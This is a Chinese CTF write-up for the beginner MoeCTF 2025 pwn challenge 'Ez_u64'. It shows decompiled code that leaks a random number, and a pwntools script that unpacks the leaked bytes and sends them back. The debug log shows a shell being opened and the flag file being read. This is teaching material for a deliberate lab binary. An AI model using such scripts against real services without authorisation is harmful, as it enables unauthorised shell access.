---
title: '西电CTF MoeCTF 2025 PWN 1 Ez_u64'
date: '2026-09-02T16:03:10+08:00'
lastmod: '2026-09-02T16:03:10+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=872)

拖进IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```



```C
int init()
{
  int fd; // [rsp+Ch] [rbp-4h]
  ...
  fd = open("/dev/urandom", 0, 0LL);
  ...
  read(fd, &num, 8uLL);
  return close(fd);
}
```

注意到num为随机数。

```C
unsigned __int64 vuln()
{
  __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Ya hello! Let's play a game.");
  printf("Guess which number I'm thinking of.");
  printf("Here is the hint.");
  write(1, &num, 8uLL);
  printf("\n>");
  __isoc99_scanf("%zu", &v1);
  if ( v1 != num )
  {
    puts("Wrong answer!");
    puts("Try pwntools u64?");
    exit(1);
  }
  puts("Win!");
  system("/bin/sh");
  return v2 - __readfsqword(0x28u);
}
```

使用write直接按内存原样输出num。

使用scanf("%zu") 读入size_t大小的无符号整数

pwntools脚本如下

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 42704)

prefix = io.recv(16 * 5 + 1)
data = io.recv(8)

io.sendline(str(u64(data)).encode())

io.interactive()
```

> pwntools的packer能够根据上下文感知`endian`和`signed `[^packer]
>
> unpack(解包)把二进制字节流转为整数。
>
> pack(打包)把整数转为二进制字节流。

输出

```
[x] Opening connection to 127.0.0.1 on port 42704
[x] Opening connection to 127.0.0.1 on port 42704: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 42704: Done
[DEBUG] Received 0x5b bytes:
    00000000  59 61 20 68  65 6c 6c 6f  21 20 4c 65  74 27 73 20  │Ya h│ello│! Le│t's │
    00000010  70 6c 61 79  20 61 20 67  61 6d 65 2e  0a 47 75 65  │play│ a g│ame.│·Gue│
    00000020  73 73 20 77  68 69 63 68  20 6e 75 6d  62 65 72 20  │ss w│hich│ num│ber │
    00000030  49 27 6d 20  74 68 69 6e  6b 69 6e 67  20 6f 66 2e  │I'm │thin│king│ of.│
    00000040  48 65 72 65  20 69 73 20  74 68 65 20  68 69 6e 74  │Here│ is │the │hint│
    00000050  2e a0 ce 7f  3b 10 6b bc  53 0a 3e                  │.···│;·k·│S·>│
    0000005b
[DEBUG] Sent 0x14 bytes:
    b'6033815318231502496\n'
[*] Switching to interactive mode

>[DEBUG] Received 0x4 bytes:
    b'Win!'
Win![DEBUG] Received 0x1 bytes:
    b'\n'

>ls

bin
dev
flag
lib
lib32
lib64
libexec
libx32
pwn


>cat flag
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 42704
```

[^packer]:参考[Packing and unpacking of strings](https://docs.pwntools.com/en/stable/util/packing.html)
